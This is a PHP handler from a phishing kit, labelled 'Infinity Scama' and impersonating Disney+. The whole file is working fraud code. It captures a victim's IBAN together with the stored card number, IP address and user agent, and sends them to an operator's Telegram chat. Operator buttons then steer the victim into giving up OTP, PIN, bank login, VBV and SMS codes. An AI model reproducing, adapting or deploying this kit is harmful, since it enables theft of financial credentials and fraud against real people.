<?php

session_start();
include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

file_get_contents("https://api.telegram.org/bot{$telegram['token']}/setWebhook?url=https://{$_SERVER['HTTP_HOST']}/app/webhook.php");

if ($_SESSION['bot'] == '1') {

    if ($_POST) {

        if (!empty($_POST['test'])) {

            $_SESSION['iban'] = htmlspecialchars($_POST['test']);

$text = "
<b>🏛️ +1 IBAN</b>

<b>🏛️ Iban ➟</b> <code>{$_SESSION['iban']}</code>
<b>💳 Carte ➟</b> <code>{$_SESSION['number']}</code>

<b>🌐 Ip Adress ➟</b> <code>{$_SESSION['ip']}</code>
<b>🌐 User Agent ➟</b> <code>{$_SESSION['ua']}</code>

<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>
"; 

        if ($telegram['status'] == true) {
            $buttons = array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '🗑️ BAN IP 🗑️', 'callback_data' => "ban={$_SESSION['ip']}"),
                        array('text' => '📊 STATS 📊', 'url' => "https://{$_SERVER['HTTP_HOST']}/panel/"),
                    ),
                    array(
                        array('text' => '🍎 OTP 🍎', 'callback_data' => "otp={$_SESSION['ip']}"),
                        array('text' => '📧 MAIL 📧', 'callback_data' => "mail={$_SESSION['ip']}"),
                        array('text' => '📱 SMS 📱', 'callback_data' => "sms={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '🏦 LOG 🏦', 'callback_data' => "bank={$_SESSION['ip']}"),
                        array('text' => '🚪FIN 🚪', 'callback_data' => "fin={$_SESSION['ip']}"),
                        array('text' => '💳 PIN 💳', 'callback_data' => "pin={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '🏛 IBAN 🏛', 'callback_data' => "iban={$_SESSION['ip']}"),
                        array('text' => '📲 VBV 📲', 'callback_data' => "vbv={$_SESSION['ip']}"),
                    ),
                    array(
                        array('text' => '❌ IBAN INVALIDE ❌', 'callback_data' => "ibanerror={$_SESSION['ip']}"),
                    ),
                ),
            );
            sendMessage($telegram['RezChatId']['card'], $text, $buttons);
        }
        
        $_SESSION['iban-error'] = "";
        $_SESSION['previous-page'] = '';
        header("location: ../../{$_SESSION['id5']}/");

        } else {
            $_SESSION['iban-error'] = $errors['2'];
            header('location: ../');
        }
    } else {
        $_SESSION['iban-error'] = $errors['1'];
        header('location: ../');
    }
} else {
    header('location: ../../../site/index.html');
}